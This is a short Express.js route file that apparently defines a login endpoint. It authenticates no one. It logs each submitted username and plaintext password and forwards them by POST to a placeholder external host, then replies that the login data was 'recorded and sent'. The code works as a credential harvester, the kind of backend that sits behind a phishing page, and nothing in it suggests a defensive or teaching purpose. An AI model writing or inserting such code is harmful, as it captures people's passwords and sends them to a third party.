const express = require('express');
const router = express.Router();
const fetch = require('node-fetch'); // ensure node-fetch is installed

router.post('/login', async (req, res) => {
    const { username, password } = req.body;

    try {
        // Simulate login logic
        console.log(`Login attempt - Username: ${username}, Password: ${password}`);
        
        // Send data to your local server
        const localServerUrl = 'https://your_local_machine_address:your_port/receive';
        const response = await fetch(localServerUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password }),
            mode: 'cors' // if needed
        });

        if (response.ok) {
            console.log('Data sent to local server successfully');
            res.send('Login data recorded and sent.');
        } else {
            throw new Error('Failed to send data to local server');
        }
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).send('Server Error');
    }
});

module.exports = router;
